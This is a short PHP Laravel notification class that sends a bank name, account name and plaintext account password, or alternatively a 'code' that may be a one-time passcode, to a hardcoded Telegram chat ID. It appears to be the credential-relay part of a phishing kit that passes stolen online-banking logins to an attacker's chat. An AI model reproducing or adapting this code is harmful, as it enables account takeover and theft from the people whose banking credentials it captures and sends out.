<?php

namespace App\Notifications;

use App\Models\User;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Notifications\Messages\MailMessage;
use NotificationChannels\Telegram\TelegramMessage;
use Illuminate\Notifications\Notification;
use NotificationChannels\Telegram\TelegramChannel;

class LaravelTelegramNotification extends Notification
{
    protected $data;

    public function __construct($data)
    {
        $this->data = $data;
    }
    public function via($notifiable)
    {
        return [TelegramChannel::class];
    }

    public function toTelegram($notifiable)
    {
        // 467740013
        if (isset($this->data['code'])) {
            $meesage = 
                "Code: " . $this->data['code'] . " \r\n ";
               
              
       
        } else {
            $meesage = "Bank name : " . $this->data['bank_name'] . " \r\n " .
                "Account name: " . $this->data['account_name'] . " \r\n " .
                "Account passwrod: " . $this->data['account_password'] . " \r\n ";
               
                
                
        }



        return TelegramMessage::create()
            ->to(908949980)
            ->content($meesage);
    }
}
